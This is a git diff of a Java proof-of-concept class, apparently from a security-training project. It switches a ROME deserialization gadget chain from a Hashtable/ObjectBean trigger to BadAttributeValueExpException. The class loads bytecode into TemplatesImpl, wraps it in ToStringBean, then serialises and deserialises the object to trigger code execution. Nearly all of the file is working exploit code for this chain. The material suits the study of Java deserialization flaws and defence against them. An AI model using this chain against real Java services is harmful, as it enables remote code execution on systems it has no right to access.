@@ -1,10 +1,10 @@
 package com.madaha.codesecone.controller.AdvancedAttack.deserialize.RomeDeserialize;
 
-import com.rometools.rome.feed.impl.ObjectBean;
 import com.rometools.rome.feed.impl.ToStringBean;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 
+import javax.management.BadAttributeValueExpException;
 import javax.xml.transform.Templates;
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
@@ -13,10 +13,9 @@ import java.io.ObjectOutputStream;
 import java.lang.reflect.Field;
 import java.nio.file.Files;
 import java.nio.file.Paths;
-import java.util.Hashtable;
 
 
-public class ROME_HashTable_PocTest {
+public class ROME_BadAttributeValueExpException_PocTest {
 
     // 获取项目根目录，设置expPath;
     private static String projectRoot = System.getProperty("user.dir");
@@ -46,15 +45,13 @@ public class ROME_HashTable_PocTest {
      *  * TemplatesImpl.getOutputProperties()
      *  * ToStringBean.toString(String)
      *  * ToStringBean.toString()
-     *  * EqualsBean.beanHashCode()
-     *  * ObjectBean.hashcode()
-     *  * HashTable.reconstitutionPut(Entry)
-     *  * HashTable.readObject(ObjectInputStream)
+     *  * BadAttributeValueExpException.readObject()
      *
      * @throws Exception
      */
-    public static void rome_HashTable_Poc() throws Exception {
+    public static void rome_BadAttributeValueExpException_Poc() throws Exception {
         TemplatesImpl templatesimpl = new TemplatesImpl();
+
         byte[] bytecodes = Files.readAllBytes(Paths.get(TemplatesImpl_class_Path));
 
         setFieldValue(templatesimpl, "_name", "PocTest");
@@ -62,19 +59,16 @@ public class ROME_HashTable_PocTest {
         setFieldValue(templatesimpl, "_tfactory", new TransformerFactoryImpl());
 
         ToStringBean toStringBean = new ToStringBean(Templates.class, templatesimpl);
-        ObjectBean objectBean = new ObjectBean(ToStringBean.class, toStringBean);
 
-        Hashtable hashTable = new Hashtable();
-        hashTable.put(objectBean, "rome");
+        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(123);
+        setFieldValue(badAttributeValueExpException, "val", toStringBean);
 
-        // 序列化
-        serialize(hashTable);
-
-        // 反序列化
+        serialize(badAttributeValueExpException);
         deserialize(rome_ser_Path);
     }
 
     public static void main(String[] args) throws  Exception {
-        rome_HashTable_Poc();
+        rome_BadAttributeValueExpException_Poc();
     }
+
 }
